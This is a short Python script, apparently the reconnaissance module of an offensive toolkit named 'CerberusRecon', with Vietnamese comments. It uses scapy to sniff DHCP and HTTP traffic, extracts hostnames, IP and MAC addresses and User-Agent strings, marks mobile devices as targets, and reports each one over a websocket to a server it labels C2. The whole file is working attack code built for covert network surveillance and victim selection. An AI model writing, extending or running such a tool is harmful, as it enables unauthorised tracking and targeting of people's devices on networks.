import json, websocket, re
from scapy.all import *

C2_URL = "ws://localhost:8080"

class CerberusRecon:
    def __init__(self):
        self.ws = websocket.create_connection(C2_URL)

    def sniff_logic(self, pkt):
        # Định danh qua DHCP Hostname
        if pkt.haslayer(DHCP):
            hostname = [opt[1] for opt in pkt[DHCP].options if opt[0] == 'hostname']
            if hostname:
                name = hostname[0].decode()
                is_mobile = any(x in name.lower() for x in ["iphone", "android", "samsung"])
                self.send_to_c2(pkt[IP].src, pkt[Ether].src, name, is_mobile)
        
        # Định danh qua User-Agent (HTTP Port 80)
        if pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt[TCP].dport == 80:
            load = pkt[Raw].load.decode(errors='ignore')
            ua = re.search(r"User-Agent: (.*)\r\n", load)
            if ua:
                self.send_to_c2(pkt[IP].src, pkt[Ether].src, ua.group(1)[:30], True)

    def send_to_c2(self, ip, mac, vendor, target):
        self.ws.send(json.dumps({"type":"NEW_DEVICE","ip":ip,"mac":mac,"vendor":vendor,"is_target":target}))

if __name__ == "__main__":
    recon = CerberusRecon()
    sniff(filter="udp port 67 or tcp port 80", prn=recon.sniff_logic, store=0)